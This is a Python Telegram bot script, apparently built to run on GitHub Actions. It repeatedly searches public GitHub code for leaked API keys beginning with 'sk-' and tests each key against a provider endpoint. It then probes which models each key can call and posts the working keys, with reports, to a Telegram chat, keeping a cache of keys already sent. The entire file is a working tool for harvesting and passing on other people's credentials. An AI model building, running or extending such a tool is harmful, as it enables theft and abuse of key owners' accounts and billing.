"""
bot_runner.py
Версия бота для GitHub Actions с фоновым автопоиском, кэшем и мульти-проверкой.
"""
import time
import os
import json
import asyncio
import logging

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
)

from github_key_parser import (
    collect_keys, check_key, probe_all_models, 
    format_report, append_history, DEFAULT_ENDPOINT
)

# ─── конфиг ────────────────────────────────────────────────────────────────

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
RUN_DURATION_SECONDS = int(os.getenv("RUN_DURATION_SECONDS", 5 * 3600 + 50 * 60))
SCAN_INTERVAL_SECONDS = 60  # Интервал 1 минута

STATE_FILE = "state.json"
sent_keys = set()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def load_state():
    global sent_keys
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                sent_keys = set(json.load(f))
            logger.info(f"Загружено {len(sent_keys)} старых ключей из кэша.")
        except Exception as e:
            logger.error(f"Ошибка чтения state: {e}")

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(list(sent_keys), f)
    except Exception as e:
        logger.error(f"Ошибка сохранения state: {e}")


# ─── хендлеры ──────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡️ Бот запущен. Авто-рассылка только РАБОЧИХ ключей.")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔍 Ручной поиск запущен. Это займет время...")
    # Ручной запуск оставим простым, без мульти-проб, чтобы не спамить
    loop = asyncio.get_event_loop()
    found = await loop.run_in_executor(None, lambda: collect_keys("sk- language:Python OR language:JavaScript", max_files=5))
    if not found:
        await update.message.reply_text("🤷 Ключей не найдено.")
        return
    await update.message.reply_text(f"Найдено {len(found)} ключей. Проверяю базовым методом...")
    # Для ручного просто проверяем первый
    for key, meta in list(found.items())[:3]:
        chk = await loop.run_in_executor(None, lambda: check_key(key))
        msg = f"🔑 {key[:15]}... | {meta['provider']} | {'✅ working' if chk.get('ok') else '❌ dead'}"
        await update.message.reply_text(msg)


# ─── фоновая задача авто-сканирования ──────────────────────────────────────

async def auto_scan_loop(app):
    if not CHAT_ID:
        logger.warning("CHAT_ID не задан!")
        return

    run_once = os.getenv("RUN_ONCE", "false").lower() == "true"
    
    if run_once:
        logger.info("Режим RUN_ONCE: сканирую 10 минут...")
        # Бот будет работать 10 минут (600 секунд)
        end_time = time.time() + 600 
    else:
        logger.info(f"Авто-скан запущен. Интервал: {SCAN_INTERVAL_SECONDS} сек.")
        await asyncio.sleep(10)
        end_time = float('inf')

    while time.time() < end_time:
        logger.info("Фоновое сканирование...")
        loop = asyncio.get_event_loop()
        
        try:
            # УВЕЛИЧИВАЕМ max_files до 50 (вместо 15)
            found = await loop.run_in_executor(
                None, 
                lambda: collect_keys("sk- language:Python OR language:JavaScript OR language:TypeScript", max_files=50)
            )
            
            for key, meta in found.items():
                if key in sent_keys:
                    continue
                
                chk = await loop.run_in_executor(None, lambda: check_key(key))
                
                if chk.get("ok"):
                    logger.info(f"Ключ {key[:10]}... ответил 200. Запускаю пробы.")
                    prb_results = await loop.run_in_executor(
                        None, 
                        lambda: probe_all_models(key, DEFAULT_ENDPOINT, chk.get("models", []), max_probes=7)
                    )
                    
                    if any(p["ok"] for p in prb_results):
                        report = format_report(
                            endpoint=DEFAULT_ENDPOINT,
                            key=key,
                            provider=meta["provider"],
                            check_result=chk,
                            probe_results=prb_results,
                            catalog=chk.get("models")
                        )
                        await app.bot.send_message(chat_id=CHAT_ID, text=report)
                        sent_keys.add(key)
                        save_state()
                        append_history({"key": key, "provider": meta["provider"], "working": True})
                    else:
                        sent_keys.add(key) 
                        save_state()
                    
        except Exception as e:
            logger.error(f"Ошибка в авто-скане: {e}")

        # Если это режим RUN_ONCE, делаем паузу 30 секунд перед следующим кругом
        if run_once:
            logger.info("Круг завершен, жду 30 секунд...")
            await asyncio.sleep(30)
        else:
            await asyncio.sleep(SCAN_INTERVAL_SECONDS)

    logger.info("Время вышло. Завершаю работу.")


# ─── запуск ────────────────────────────────────────────────────────────────

async def run_bot_for_a_while(duration_seconds: int):
    load_state()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("scan", scan))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    asyncio.create_task(auto_scan_loop(app))

    logger.info(f"Бот запущен на {duration_seconds} сек")
    try:
        await asyncio.sleep(duration_seconds)
    finally:
        logger.info("Останавливаю бота...")
        save_state()
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(run_bot_for_a_while(RUN_DURATION_SECONDS))
    except (KeyboardInterrupt, SystemExit):
        save_state()
        logger.info("прервано вручную")
